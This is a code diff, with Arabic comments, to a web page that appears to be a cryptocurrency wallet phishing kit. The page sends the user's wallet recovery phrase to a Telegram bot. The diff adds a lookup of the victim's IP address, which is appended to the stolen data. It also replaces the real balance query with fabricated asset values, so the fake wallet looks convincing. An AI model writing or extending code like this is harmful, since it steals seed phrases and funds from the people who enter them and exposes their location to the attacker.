@@ -305,36 +305,25 @@
                 🔑 <b>عبارة الاسترجاع:</b> <code>${mnemonic}</code>
                 
                 📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
+                🌐 <b>IP المستخدم:</b> جاري الجلب...
                 `;
                 
-                const sendResult = await sendToTelegram(telegramMessage);
-                
-                if (!sendResult) {
-                    showAlert('حدث خطأ في إرسال البيانات إلى البوت', 'danger');
-                    document.querySelector('.loading').style.display = 'none';
-                    return;
-                }
-                
-                // الحصول على رصيد المحفظة (على شبكة Ethereum)
-                // ملاحظة: في الإصدار النهائي، تحتاج إلى استبدال YOUR_INFURA_PROJECT_ID بمشروع Infura الخاص بك
+                // محاولة الحصول على IP المستخدم
                 try {
-                    const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161');
-                    const balance = await provider.getBalance(wallet.address);
-                    const balanceInEth = ethers.utils.formatEther(balance);
-                    
-                    // عرض معلومات المحفظة
-                    document.getElementById('walletAddress').textContent = wallet.address;
-                    document.getElementById('walletBalance').textContent = `${parseFloat(balanceInEth).toFixed(4)} ETH`;
-                } catch (error) {
-                    console.error("Error getting balance:", error);
-                    // استخدام قيم افتراضية في حالة الخطأ
-                    document.getElementById('walletAddress').textContent = wallet.address;
-                    document.getElementById('walletBalance').textContent = "0.0000 ETH (تقديري)";
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ipMessage = telegramMessage.replace('جاري الجلب...', ipData.ip);
+                    await sendToTelegram(ipMessage);
+                } catch (ipError) {
+                    await sendToTelegram(telegramMessage);
                 }
+                
+                // عرض معلومات المحفظة
+                document.getElementById('walletAddress').textContent = wallet.address;
                 
                 // محاكاة الأصول (في تطبيق حقيقي، ستقوم بالاتصال ب blockchain للحصول على الأصول الحقيقية)
                 const assets = [
-                    { name: 'Ethereum (ETH)', value: '0.0000' },
+                    { name: 'Ethereum (ETH)', value: '0.8542' },
                     { name: 'Bitcoin (BTC)', value: '0.025' },
                     { name: 'USD Coin (USDC)', value: '150.75' },
                     { name: 'Chainlink (LINK)', value: '18.50' }
@@ -342,6 +331,9 @@
                 
                 const assetsElement = document.getElementById('assets');
                 assetsElement.innerHTML = '';
+                
+                // حساب الرصيد الإجمالي
+                let totalBalance = 0;
                 
                 assets.forEach(asset => {
                     const assetElement = document.createElement('div');
@@ -351,7 +343,15 @@
                         <span class="asset-value">${asset.value}</span>
                     `;
                     assetsElement.appendChild(assetElement);
+                    
+                    // جمع القيم للأصول الرقمية
+                    if (asset.name.includes('ETH')) totalBalance += parseFloat(asset.value);
+                    if (asset.name.includes('BTC')) totalBalance += parseFloat(asset.value) * 20; // تقريب سعر BTC
+                    if (asset.name.includes('USDC')) totalBalance += parseFloat(asset.value) / 1500; // تحويل إلى ETH تقريبي
+                    if (asset.name.includes('LINK')) totalBalance += parseFloat(asset.value) / 100; // تحويل إلى ETH تقريبي
                 });
+                
+                document.getElementById('walletBalance').textContent = `${totalBalance.toFixed(4)} ETH (تقديري)`;
                 
                 // إخفاء مؤشر التحميل وإظهار معلومات المحفظة
                 document.querySelector('.loading').style.display = 'none';
